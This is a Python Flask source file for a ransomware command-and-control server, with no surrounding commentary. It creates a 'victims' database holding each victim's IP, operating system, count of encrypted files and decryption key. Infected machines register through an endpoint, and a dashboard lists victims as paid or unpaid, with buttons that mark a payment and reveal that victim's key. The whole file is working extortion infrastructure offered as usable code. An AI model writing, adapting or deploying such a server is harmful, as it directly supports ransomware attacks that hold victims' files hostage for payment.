from flask import Flask, request, jsonify
import sqlite3
from datetime import datetime

app = Flask(__name__)

def setup_database():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                (id TEXT PRIMARY KEY, 
                 ip TEXT, 
                 os TEXT,
                 files INTEGER,
                 key TEXT,
                 paid INTEGER DEFAULT 0,
                 time TEXT)''')
    conn.commit()
    conn.close()

class C2Server:
    def __init__(self):
        setup_database()
        print("[+] C2 Server initialized")
        print("[+] Accepting connections on http://0.0.0.0:5000")
    
    def get_victims(self):
        conn = sqlite3.connect('victims.db')
        c = conn.cursor()
        c.execute("SELECT * FROM victims ORDER BY time DESC")
        victims = c.fetchall()
        conn.close()
        return victims
    
    def run(self, port=5000):
        @app.route('/')
        def dashboard():
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("SELECT * FROM victims ORDER BY time DESC")
            victims = c.fetchall()
            conn.close()
            
            html = """
            <html>
            <head><title>Ransomware C2 Dashboard</title>
            <style>
                body { font-family: Arial; margin: 40px; background: #1a1a1a; color: white; }
                .container { max-width: 800px; margin: 0 auto; }
                .victim { background: #2a2a2a; padding: 15px; margin: 10px 0; border-radius: 5px; }
                .paid { border-left: 5px solid green; }
                .unpaid { border-left: 5px solid red; }
                button { background: #4CAF50; color: white; border: none; padding: 8px 15px; cursor: pointer; }
            </style>
            </head>
            <body>
                <div class="container">
                    <h1>Ransomware C2 Dashboard</h1>
                    <h3>Connected Victims: """ + str(len(victims)) + """</h3>
            """
            
            for v in victims:
                status = "PAID" if v[5] else "UNPAID"
                color = "green" if v[5] else "red"
                html += f"""
                <div class="victim {'paid' if v[5] else 'unpaid'}">
                    <strong>ID:</strong> {v[0]}<br>
                    <strong>IP:</strong> {v[1]}<br>
                    <strong>OS:</strong> {v[2]} | <strong>Files:</strong> {v[3]}<br>
                    <strong>Status:</strong> <span style="color:{color}">{status}</span>
                    <button onclick="markPaid('{v[0]}')">Mark Paid</button>
                    <button onclick="getKey('{v[0]}')">Get Key</button>
                </div>
                """
            
            html += """
                </div>
                <script>
                    function markPaid(id) {
                        fetch('/mark_paid/' + id);
                        setTimeout(() => location.reload(), 500);
                    }
                    function getKey(id) {
                        fetch('/get_key/' + id)
                            .then(r => r.json())
                            .then(data => {
                                if (data.key) {
                                    prompt('Decryption Key:', data.key);
                                }
                            });
                    }
                </script>
            </body>
            </html>
            """
            return html
        
        @app.route('/register', methods=['POST'])
        def register():
            data = request.json
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO victims VALUES (?, ?, ?, ?, ?, ?, ?)",
                     (data['id'], data.get('ip', ''), data.get('os', ''),
                      data.get('files', 0), data.get('key', ''),
                      0, datetime.now().isoformat()))
            conn.commit()
            conn.close()
            print(f"[+] New victim registered: {data['id']}")
            return jsonify({'status': 'ok'})
        
        @app.route('/mark_paid/<victim_id>')
        def mark_paid(victim_id):
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("UPDATE victims SET paid=1 WHERE id=?", (victim_id,))
            conn.commit()
            conn.close()
            print(f"[+] Marked as paid: {victim_id}")
            return jsonify({'status': 'ok'})
        
        @app.route('/get_key/<victim_id>')
        def get_key(victim_id):
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("SELECT key FROM victims WHERE id=?", (victim_id,))
            result = c.fetchone()
            conn.close()
            if result:
                return jsonify({'key': result[0]})
            return jsonify({'error': 'not found'})
        
        print(f"[+] Starting C2 server on port {port}")
        app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    server = C2Server()
    server.run()